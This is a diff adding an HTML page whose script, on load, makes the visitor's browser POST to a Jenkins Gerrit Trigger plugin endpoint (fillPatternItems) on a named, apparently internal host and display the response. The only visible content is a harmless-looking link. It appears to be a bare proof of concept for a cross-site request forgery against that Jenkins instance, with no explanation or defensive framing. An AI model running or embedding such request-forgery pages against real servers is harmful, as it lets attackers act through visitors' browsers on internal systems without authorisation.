@@ -1,0 +1,26 @@
+<html>
+<script>
+    var localfile = "http://ft.jenkins.baidu.com/job/eim-main/descriptorByName/com.sonyericsson.hudson.plugins.gerrit.trigger.hudsontrigger.data.GerritProject/fillPatternItems"
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange=function()
+    {
+    if (xhr.readyState==4)
+    {
+    alert(xhr.responseText);
+    }
+    }
+    
+    try {
+    xhr.open("POST", localfile, true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.send('serverName=');
+    }
+    catch (ex) {
+    alert(ex.message);
+    }
+</script>
+
+    <body>
+        <p><a href="https://www.baidu.com">universal link</a> </p>
+    </body>
+</html>
